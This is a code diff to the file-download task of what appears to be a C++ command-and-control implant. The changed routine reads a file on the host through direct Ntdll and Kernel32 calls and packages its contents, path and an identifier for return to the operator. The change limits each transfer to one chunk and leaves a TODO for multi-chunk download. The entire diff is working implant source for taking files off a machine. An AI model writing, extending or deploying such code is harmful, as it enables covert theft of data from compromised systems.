@@ -188,6 +188,18 @@ auto DECLFN Task::Download(
     
     KhDbg("File size: %d bytes", FileSize);
     
+    // Calculate actual chunk size to send (limited by KH_CHUNK_SIZE)
+    ULONG ChunkSize = (FileSize > KH_CHUNK_SIZE) ? KH_CHUNK_SIZE : FileSize;
+    ULONG TotalChunks = (FileSize + KH_CHUNK_SIZE - 1) / KH_CHUNK_SIZE;
+    
+    KhDbg("Sending first chunk: %d bytes of %d total bytes (%d chunks total)", ChunkSize, FileSize, TotalChunks);
+    
+    // For now, only send the first chunk. This prevents large response issues
+    // TODO: Implement proper multi-chunk download like upload
+    if (FileSize > KH_CHUNK_SIZE) {
+        KhDbg("WARNING: File larger than chunk size. Only sending first %d bytes.", KH_CHUNK_SIZE);
+    }
+    
     // Extract filename from path for file ID
     PCHAR FileName = FilePath;
     PCHAR LastSlash = nullptr;
@@ -198,9 +210,9 @@ auto DECLFN Task::Download(
     }
     if (LastSlash) FileName = LastSlash;
     
-    // Allocate buffer for entire file
-    BYTE* FileBuffer = (BYTE*)hAlloc(FileSize);
-    if (!FileBuffer && FileSize > 0) {
+    // Allocate buffer for the chunk we'll send
+    BYTE* FileBuffer = (BYTE*)hAlloc(ChunkSize);
+    if (!FileBuffer && ChunkSize > 0) {
         CHAR* ErrorMsg = "Failed to allocate file buffer";
         KhDbg("%s", ErrorMsg);
         Self->Ntdll.NtClose(FileHandle);
@@ -208,14 +220,14 @@ auto DECLFN Task::Download(
         return KhRetSuccess;
     }
     
-    // Read entire file
+    // Read the chunk (first part of file)
     ULONG BytesRead = 0;
     BOOL ReadResult = TRUE;
-    if (FileSize > 0) {
+    if (ChunkSize > 0) {
         ReadResult = Self->Krnl32.ReadFile(
             FileHandle,
             FileBuffer,
-            FileSize,
+            ChunkSize,
             &BytesRead,
             0
         );
@@ -223,8 +235,8 @@ auto DECLFN Task::Download(
     
     Self->Ntdll.NtClose(FileHandle);
     
-    if (!ReadResult || BytesRead != FileSize) {
-        CHAR* ErrorMsg = "Failed to read file";
+    if (!ReadResult || BytesRead != ChunkSize) {
+        CHAR* ErrorMsg = "Failed to read file chunk";
         KhDbg("%s: %s", ErrorMsg, FilePath);
         if (FileBuffer) hFree(FileBuffer);
         Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
@@ -244,18 +256,18 @@ auto DECLFN Task::Download(
     
     // Send response in expected format:
     // current_chunk (Int32), file_id (String), file_path (String), chunk_size (Int32), file_data (bytes)
-    Self->Pkg->Int32(Package, 1);            // chunk number (always 1 for complete file)
+    Self->Pkg->Int32(Package, 1);            // chunk number (always 1 for first chunk)
     Self->Pkg->Str(Package, FileID);         // file identifier
     Self->Pkg->Str(Package, FilePath);       // full file path
-    Self->Pkg->Int32(Package, FileSize);     // data size
+    Self->Pkg->Int32(Package, BytesRead);    // actual bytes read (chunk size)
     
     // Send file data
-    if (FileSize > 0) {
-        Self->Pkg->Bytes(Package, FileBuffer, FileSize);
+    if (BytesRead > 0) {
+        Self->Pkg->Bytes(Package, FileBuffer, BytesRead);
         hFree(FileBuffer);
     }
     
-    KhDbg("Download completed successfully: %d bytes", FileSize);
+    KhDbg("Download completed successfully: %d bytes sent (%d total file size)", BytesRead, FileSize);
     return KhRetSuccess;
 }
 
